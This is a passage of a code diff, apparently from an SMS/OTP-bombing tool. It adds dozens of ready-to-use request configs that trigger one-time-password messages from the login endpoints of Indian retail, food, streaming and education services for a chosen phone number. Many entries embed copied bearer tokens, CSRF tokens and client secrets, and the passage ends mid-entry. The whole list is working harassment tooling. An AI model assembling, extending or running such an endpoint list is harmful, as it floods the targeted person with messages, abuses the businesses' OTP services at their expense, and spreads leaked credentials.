@@ -63,7 +63,777 @@ _global_stats = defaultdict(lambda: {
 # 📋 ALL APIS (Old + 16 New) — 120+ ENDPOINTS
 # ═══════════════════════════════════════════════════════════
 ULTIMATE_APIS = [
-    # ══════════════ NEW APIS (16) ══════════════
+    # ══════════════ NEW APIS ADDED (Based on User Request) ══════════════
+    {
+        "name": "myntra_gateway",
+        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-meta-app": "deviceId=1719ab7b-4693-4a04-8985-61f250ee1bf5;appFamily=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36;reqChannel=mweb;channel=web;",
+            "deviceid": "1719ab7b-4693-4a04-8985-61f250ee1bf5",
+            "x-myntraweb": "Yes",
+            "x-location-context": "pincode=781002;source=IP",
+            "x-requested-with": "browser",
+            "origin": "https://www.myntra.com",
+            "referer": "https://www.myntra.com/login?referer=https%3A%2F%2Fwww.myntra.com%2Fmy%2Fdashboard"
+        },
+        "data": lambda p: f'{{"phoneNumber":"{p}","signup":"ONECLICK"}}'
+    },
+    {
+        "name": "cordelia_cruises",
+        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "origin": "https://www.cordeliacruises.com",
+            "referer": "https://www.cordeliacruises.com/"
+        },
+        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/upcoming-cruises","pageCode":"login"}}'
+    },
+    {
+        "name": "gokwik_v3",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "gk-version": "20260122163136947",
+            "gk-timestamp": "58981024",
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTQzMDczNiwiZXhwIjoxNzY5NDMwNzk2fQ.uioTFtFeWVOTNOLZU5o5JFii1QQV-XI-PLRO8XtTPVM",
+            "gk-signature": "292114",
+            "gk-udf-1": "684",
+            "kp-integration-type": "PLUGIN",
+            "gk-request-id": "556fc4c5-9562-46fe-ae1d-7148e3299005",
+            "gk-merchant-id": "19g6illukf2pz",
+            "origin": "https://pdp.gokwik.co",
+            "referer": "https://pdp.gokwik.co/"
+        },
+        "data": lambda p: f'{{"phone":"{p}","country":"IN"}}'
+    },
+    {
+        "name": "snapdeal_signup",
+        "url": "https://m.snapdeal.com/signupCompleteAjax",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json;charset=UTF-8",
+            "origin": "https://m.snapdeal.com",
+            "referer": "https://m.snapdeal.com/signin"
+        },
+        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
+    },
+    {
+        "name": "nykaafashion_otp",
+        "url": "https://www.nykaafashion.com/webscripts/api/otp/generate",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-csrf-token": "VhUNo81xmmF6kwoK",
+            "origin": "https://www.nykaafashion.com",
+            "referer": "https://www.nykaafashion.com/my-account?nav=my_account"
+        },
+        "data": lambda p: f'{{"customer_mobile":"{p}"}}'
+    },
+    {
+        "name": "fabindia_otp",
+        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
+            "origin": "https://www.fabindia.com",
+            "referer": "https://www.fabindia.com/"
+        },
+        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
+    },
+    {
+        "name": "shoppersstop_otp",
+        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "origin": "https://www.shoppersstop.com",
+            "referer": "https://www.shoppersstop.com/"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
+    },
+    {
+        "name": "olx_authenticate",
+        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-panamera-client-id": "web-mobile",
+            "x-panamera-client-version": "11.24.1",
+            "origin": "https://www.olx.in",
+            "referer": "https://www.olx.in/en-in"
+        },
+        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
+    },
+    {
+        "name": "tatadigital_check",
+        "url": "https://api.tatadigital.com/api/v3/sso/check-phone",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "client_id": "TCP-WEB-APP",
+            "client_secret": "6fe27bd7-658d-4d28-ab66-a71da9637529",
+            "neu-app-version": "6.1.0",
+            "anonymous_id": "33d6b700-f6e0-4467-ab04-c4421670e82b",
+            "origin": "https://www.tataneu.com",
+            "referer": "https://www.tataneu.com/"
+        },
+        "data": lambda p: f'{{"countryCode":"91","phone":"{p}","referralCode":"","sendOtp":true}}'
+    },
+    {
+        "name": "bigbasket_otp",
+        "url": "https://www.bigbasket.com/member-tdl/v3/member/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "x-caller": "Monster-SVC",
+            "referring-client": "https://www.bigbasket.com",
+            "x-tracker": "cbb828e2-b08f-45e5-81f8-f3a7a71106af",
+            "x-channel": "BB-PWA",
+            "origin": "https://www.bigbasket.com"
+        },
+        "data": lambda p: f'{{"identifier":"{p}","referrer":"unified_login","recaptchaToken":""}}'
+    },
+    {
+        "name": "zepto_send_otp",
+        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "content-type": "application/json; charset=UTF-8",
+            "platform": "WEB",
+            "x-csrf-secret": "uD0aoNYI_ZA",
+            "origin": "https://www.zepto.com",
+            "referer": "https://www.zepto.com/"
+        },
+        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
+    },
+    {
+        "name": "pepperfry_otp",
+        "url": "https://www.pepperfry.com/api/account/auth/sentOtp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "platform": "wap_mob",
+            "source": "wap",
+            "origin": "https://www.pepperfry.com",
+            "referer": "https://www.pepperfry.com/"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","mobile_country":"+91","token":""}}'
+    },
+    {
+        "name": "croma_check_phone",
+        "url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "client_id": "CROMA-WEB-APP",
+            "origin": "https://www.croma.com",
+            "referer": "https://www.croma.com/"
+        },
+        "data": lambda p: f'{{"countryCode":"91","phone":"{p}"}}'
+    },
+    {
+        "name": "eurekaforbes_otp",
+        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "client": "web",
+            "origin": "https://www.eurekaforbes.com",
+            "referer": "https://www.eurekaforbes.com/login"
+        },
+        "data": lambda p: f'{{"mobile_number":"{p}"}}'
+    },
+    {
+        "name": "zestmoney_otp",
+        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
+            "origin": "https://app.zestmoney.in",
+            "referer": "https://app.zestmoney.in/"
+        },
+        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
+    },
+    {
+        "name": "urbanladder_otp",
+        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
+            "origin": "https://www.urbanladder.com",
+            "referer": "https://www.urbanladder.com/auth/login"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
+    },
+    {
+        "name": "mamaearth_gokwik",
+        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
+            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
+            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
+            "gk-merchant-id": "12wyqc26spoknx0kv7t",
+            "origin": "https://mamaearth.in",
+            "referer": "https://mamaearth.in/"
+        },
+        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
+    },
+    {
+        "name": "allen_send_otp",
+        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
+            "x-client-type": "mweb",
+            "origin": "https://allen.in",
+            "referer": "https://allen.in/"
+        },
+        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
+    },
+    {
+        "name": "maxfashion_otp",
+        "url": "https://www.maxfashion.in/in/en/mobilelogin/sendOTP",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest",
+            "content-type": "application/json;",
+            "origin": "https://www.maxfashion.in",
+            "referer": "https://www.maxfashion.in/in/en/"
+        },
+        "data": lambda p: f'{{"signInMobile":"+91{p}"}}'
+    },
+    {
+        "name": "lifestylestores_otp",
+        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest",
+            "content-type": "application/json;",
+            "origin": "https://www.lifestylestores.com",
+            "referer": "https://www.lifestylestores.com/in/en/"
+        },
+        "data": lambda p: f'{{"signInMobile":"+91{p}"}}'
+    },
+    {
+        "name": "sparindia_otp",
+        "url": "https://www.sparindia.com/api/get-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3Njk1Mjc2MTcsImV4cCI6MTc2OTUyNzkxN30.m1KkAzXZANYyYRXfaBV8ogoo0VBpP-6lASO5ygw0TFI",
+            "origin": "https://www.sparindia.com",
+            "referer": "https://www.sparindia.com/"
+        },
+        "data": lambda p: f'{{"mobile_number":"{p}","finalStore":"view_20011"}}'
+    },
+    {
+        "name": "hotstar_login",
+        "url": "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "x-hs-platform": "mweb",
+            "x-country-code": "in",
+            "x-hs-accept-language": "eng",
+            "origin": "https://www.hotstar.com",
+            "referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin"
+        },
+        "data": lambda p: f'{{"body":{{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"recaptcha_token":"","phone_number":"{p}"}}}}'
+    },
+    {
+        "name": "dailyhunt_pwa",
+        "url": "https://dailyhunt.in/api/pwa",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "origin": "https://dailyhunt.in",
+            "referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
+        },
+        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
+    },
+    {
+        "name": "justdial_sendvcode",
+        "url": "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&randtime=1769573201013&qid={p}-02026000010002800009000360004200009-50105373614400053736000820000360000024&t_and_c=1&source=2&version=6.4&enc=1&env=p",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "origin": "https://www.justdial.com",
+            "referer": "https://www.justdial.com/login?from=sidemenu_hmpge&redirect=/&scllogin=1"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","fname":""}}'
+    },
+    {
+        "name": "pharmeasy_apt_otp",
+        "url": "https://pharmeasy.in/apt-api/login/send-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "origin": "https://pharmeasy.in",
+            "referer": "https://pharmeasy.in/"
+        },
+        "data": lambda p: f'{{"param":"{p}"}}'
+    },
+    {
+        "name": "netmeds_otp",
+        "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "authorization": "Bearer NjVmNTYyYzE1MDRhNTlhNjdmNTI5YWQ0Ol9VLW9oSTRJeQ==",
+            "origin": "https://www.netmeds.com",
+            "referer": "https://www.netmeds.com/auth/login?redirectUrl=%2Fc%2Fmy-accounts"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"91"}}'
+    },
+    {
+        "name": "bookmyshow_otp",
+        "url": "https://in.bookmyshow.com/api/members/otp/send",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "x-app-code": "WEBV2",
+            "x-region-slug": "mumbai",
+            "x-platform-code": "WEBV2",
+            "x-region-code": "MUMBAI",
+            "origin": "https://in.bookmyshow.com",
+            "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
+        },
+        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
+    },
+    {
+        "name": "bewakoof_otp",
+        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
+            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
+            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
+            "origin": "https://www.bewakoof.com",
+            "referer": "https://www.bewakoof.com/"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
+    },
+    {
+        "name": "aakash_generate_otp",
+        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json",
+            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
+            "origin": "https://www.aakash.ac.in",
+            "referer": "https://www.aakash.ac.in/"
+        },
+        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
+    },
+    {
+        "name": "lenskart_send_otp",
+        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "X-API-Client": "mobilesite",
+            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
+            "Origin": "https://www.lenskart.com",
+            "Referer": "https://www.lenskart.com/",
+            "User-Agent": "Mozilla/5.0"
+        },
+        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
+    },
+    {
+        "name": "gopinkcabs_login",
+        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0"
+        },
+        "data": lambda p: f"check_mobile_number=1&contact={p}"
+    },
+    {
+        "name": "shemaroome_resend",
+        "url": "https://www.shemaroome.com/users/resend_otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0"
+        },
+        "data": lambda p: f"mobile_no=%2B91{p}"
+    },
+    {
+        "name": "kpnfresh_web",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "x-channel-id": "WEB",
+            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
+            "User-Agent": "Mozilla/5.0"
+        },
+        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
+    },
+    {
+        "name": "kpnfresh_and",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
+            "User-Agent": "okhttp/5.0.0-alpha.11"
+        },
+        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
+    },
+    {
+        "name": "bikefixup_otp",
+        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "client": "app",
+            "User-Agent": "Dart/3.6"
+        },
+        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
+    },
+    {
+        "name": "rappi_wa",
+        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Deviceid": "5df83c463f0ff8ff"
+        },
+        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
+    },
+    {
+        "name": "stratzy_sms",
+        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://stratzy.in",
+            "Referer": "https://stratzy.in/login"
+        },
+        "data": lambda p: f'{{"phoneNo":"{p}"}}'
+    },
+    {
+        "name": "stratzy_wa",
+        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://stratzy.in"
+        },
+        "data": lambda p: f'{{"phoneNo":"{p}"}}'
+    },
+    {
+        "name": "wellacademy_login",
+        "url": "https://wellacademy.in/store/api/numberLoginV2",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://wellacademy.in"
+        },
+        "data": lambda p: f'{{"contact_no":"{p}"}}'
+    },
+    {
+        "name": "hungama_otp",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.hungama.com",
+            "identifier": "home",
+            "country_code": "IN"
+        },
+        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'
+    },
+    {
+        "name": "servetel_otp",
+        "url": "https://api.servetel.in/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Dalvik/2.1.0"
+        },
+        "data": lambda p: f"mobile_number={p}"
+    },
+    {
+        "name": "merucab_otp",
+        "url": "https://merucabapp.com/api/otp/generate",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
+            "User-Agent": "okhttp/4.9.0"
+        },
+        "data": lambda p: f"mobile_number={p}"
+    },
+    {
+        "name": "beepkart_otp",
+        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.beepkart.com"
+        },
+        "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'
+    },
+    {
+        "name": "lendingplate_api",
+        "url": "https://lendingplate.com/api.php",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://lendingplate.com"
+        },
+        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
+    },
+    {
+        "name": "snitch_otp",
+        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "client-id": "snitch_secret",
+            "Origin": "https://www.snitch.com"
+        },
+        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
+    },
+    {
+        "name": "dayco_otp",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://ekyc.daycoindia.com"
+        },
+        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
+    },
+    {
+        "name": "penpencil_resend",
+        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "okhttp/3.9.1"
+        },
+        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
+    },
+    {
+        "name": "imaginestore_otp",
+        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.myimaginestore.com"
+        },
+        "data": lambda p: f"mobile={p}"
+    },
+    {
+        "name": "nobroker_otp",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.nobroker.in"
+        },
+        "data": lambda p: f"phone={p}&countryCode=IN"
+    },
+    {
+        "name": "cossouq_otp",
+        "url": "https://www.cossouq.com/mobilelogin/otp/send",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.cossouq.com"
+        },
+        "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
+    },
+    {
+        "name": "shiprocket_otp",
+        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "authorization": "Bearer null",
+            "Origin": "https://app.shiprocket.in"
+        },
+        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
+    },
+    {
+        "name": "jockey_sms",
+        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
+        "method": "GET",
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Referer": "https://www.jockey.in/"
+        },
+        "data": None
+    },
+    {
+        "name": "jockey_wa",
+        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
+        "method": "GET",
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Referer": "https://www.jockey.in/"
+        },
+        "data": None
+    },
+    {
+        "name": "newme_otp",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Caller": "web_app",
+            "Origin": "https://newme.asia"
+        },
+        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
+    },
+    {
+        "name": "univest_otp",
